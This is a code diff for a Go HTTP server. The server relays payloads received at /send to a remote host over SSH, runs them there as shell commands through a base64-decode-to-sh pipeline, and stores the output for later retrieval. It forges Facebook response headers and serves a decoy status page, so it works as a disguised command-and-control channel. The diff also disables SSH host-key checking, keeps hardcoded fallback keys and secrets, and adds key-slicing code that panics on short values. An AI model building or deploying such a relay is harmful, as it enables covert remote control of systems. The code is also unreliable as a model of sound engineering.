@@ -18,7 +18,7 @@ import (
     "golang.org/x/crypto/ssh"
 )
 
-// Buffer manages encrypted session data between /send and /receive
+// Buffer manages per-client data with expiration
 type Buffer struct {
     data map[string][]message
     mu   sync.RWMutex
@@ -91,15 +91,27 @@ func (b *Buffer) cleanup() {
     }
 }
 
-// AES Encryption Setup
+// AES Encryption
 var (
     buffer     = NewBuffer()
-    encryptKey = []byte("1234567890abcdef") // Hardcoded fallback (dev only!)
-    authSecret = "super_secret_auth"        // Auth secret (dev only!)
-    sshClient  *ssh.Client                 // Global SSH client
+    encryptKey []byte
+    authSecret string
+    sshClient  *ssh.Client
 )
 
-// Facebook-like Random String Generators
+func init() {
+    // Read keys from environment
+    encryptKey = []byte(os.Getenv("ENCRYPTION_KEY"))[:16]
+    if len(encryptKey) != 16 {
+        encryptKey = []byte("default_key_1234") // Fallback for dev
+    }
+    authSecret = os.Getenv("AUTH_SECRET")
+    if authSecret == "" {
+        authSecret = "dev_secret_987"
+    }
+}
+
+// Facebook-like random generators
 func generateFacebookDebugID() string {
     const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
     result := make([]byte, 16)
@@ -153,7 +165,7 @@ func decrypt(ciphertext []byte) ([]byte, error) {
     return data, nil
 }
 
-// Add Facebook Response Headers
+// Add Facebook headers
 func addFacebookHeaders(w http.ResponseWriter) {
     w.Header().Set("Content-Type", "application/json; charset=UTF-8")
     w.Header().Set("X-FB-Debug", generateFacebookDebugID())
@@ -166,19 +178,19 @@ func addFacebookHeaders(w http.ResponseWriter) {
     w.Header().Set("Strict-Transport-Security", "max-age=15552000; preload")
 }
 
-// Initialize SSH Connection
+// Connect to SSH
 func connectToSSH() error {
     config := &ssh.ClientConfig{
-    User: os.Getenv("SSH_USER"),
-    Auth: []ssh.AuthMethod{
-        ssh.Password(os.Getenv("SSH_PASSWORD")),
-    },
-    HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-    Config: &ssh.Config{ //  Add pointer here
-        Compression: true,
-    },
-}
-
+        User: os.Getenv("SSH_USER"),
+        Auth: []ssh.AuthMethod{
+            ssh.Password(os.Getenv("SSH_PASSWORD")),
+        },
+        HostKeyCallback: ssh.InsecureIgnoreHostKey(), // For testing only!
+        Timeout:         10 * time.Second,
+        Config: &ssh.Config{
+            Compression: true,
+        },
+    }
     client, err := ssh.Dial("tcp", os.Getenv("SSH_ADDR"), config)
     if err != nil {
         return err
@@ -186,20 +198,6 @@ func connectToSSH() error {
     sshClient = client
     log.Println("SSH connection established")
     return nil
-}
-
-// Background Reconnect Task
-func startSSHBackgroundLoop() {
-    go func() {
-        for {
-            if sshClient == nil {
-                if err := connectToSSH(); err != nil {
-                    log.Printf("SSH reconnect failed: %v", err)
-                }
-            }
-            time.Sleep(10 * time.Second) // Reconnect interval
-        }
-    }()
 }
 
 // Handlers
@@ -240,7 +238,7 @@ func sendHandler(w http.ResponseWriter, r *http.Request) {
         data, err = decrypt(encryptedData)
         if err != nil {
             addFacebookHeaders(w)
-            http.Error(w, `{"error": "Payload processing failed"}`, http.StatusBadRequest)
+            http.Error(w, `{"error": "Payload processing failed"}`, http.StatusInternalServerError)
             return
         }
     } else {
@@ -253,23 +251,19 @@ func sendHandler(w http.ResponseWriter, r *http.Request) {
             return
         }
 
-        if len(encryptedData) > aes.BlockSize {
-            data, err = decrypt(encryptedData)
-            if err != nil {
-                decoded, decErr := base64.StdEncoding.DecodeString(string(encryptedData))
-                if decErr == nil && len(decoded) > aes.BlockSize {
-                    data, err = decrypt(decoded)
-                }
-                if err != nil {
-                    data = encryptedData
-                }
+        data, err = decrypt(encryptedData)
+        if err != nil && len(encryptedData) > aes.BlockSize {
+            decoded, decErr := base64.StdEncoding.DecodeString(string(encryptedData))
+            if decErr == nil && len(decoded) > aes.BlockSize {
+                data, err = decrypt(decoded)
             }
-        } else {
-            data = encryptedData
+            if err != nil {
+                data = encryptedData
+            }
         }
     }
 
-    // Execute over SSH if connected
+    // Execute command over SSH
     if sshClient == nil {
         if err := connectToSSH(); err != nil {
             log.Printf("SSH initialization failed: %v", err)
@@ -283,16 +277,17 @@ func sendHandler(w http.ResponseWriter, r *http.Request) {
         } else {
             defer session.Close()
 
-            cmd := string(data)
+            cmd := fmt.Sprintf("echo '%s' | base64 -d | sh 2>&1", base64.StdEncoding.EncodeToString(data))
             output, err := session.CombinedOutput(cmd)
             if err != nil {
-                log.Printf("Remote command failed: %v", err)
-                output = []byte(fmt.Sprintf("Error: %s\n%s", err, output))
+                log.Printf("Command error: %v", err)
+                output = []byte(fmt.Sprintf("Error: %v\nOutput: %s", err, output))
             }
             buffer.Add(token, output)
         }
     } else {
-        buffer.Add(token, []byte("SSH NOT CONNECTED:\n"+string(data)))
+        // Fallback if SSH not available
+        buffer.Add(token, append([]byte("SSH NOT CONNECTED:\n"), data...))
     }
 
     addFacebookHeaders(w)
@@ -368,7 +363,6 @@ func healthHandler(w http.ResponseWriter, r *http.Request) {
         fmt.Fprintf(w, `<!DOCTYPE html><html><body><h1>Service Status</h1></body></html>`)
         return
     }
-
     addFacebookHeaders(w)
     json.NewEncoder(w).Encode(map[string]interface{}{
         "status":      "online",
@@ -395,23 +389,24 @@ func rootHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
+    init := os.Getenv("ENCRYPTION_KEY")
+    if init != "" {
+        encryptKey = []byte(init)[:16]
+    }
+
     buffer.StartCleanupTask()
 
-    // Read key from environment or use dev fallback
-    if envKey := os.Getenv("ENCRYPTION_KEY"); envKey != "" {
-        envKeyBytes := []byte(envKey)
-        if len(envKeyBytes) >= 16 {
-            encryptKey = envKeyBytes[:16]
+    // Start SSH background reconnect task
+    go func() {
+        for {
+            if sshClient == nil {
+                if err := connectToSSH(); err != nil {
+                    log.Printf("SSH retry failed: %v", err)
+                }
+            }
+            time.Sleep(10 * time.Second)
         }
-    }
-
-    // Read auth secret from environment
-    if envAuth := os.Getenv("AUTH_SECRET"); envAuth != "" {
-        authSecret = envAuth
-    }
-
-    // Start SSH background loop
-    startSSHBackgroundLoop()
+    }()
 
     // Set up routes
     mux := http.NewServeMux()
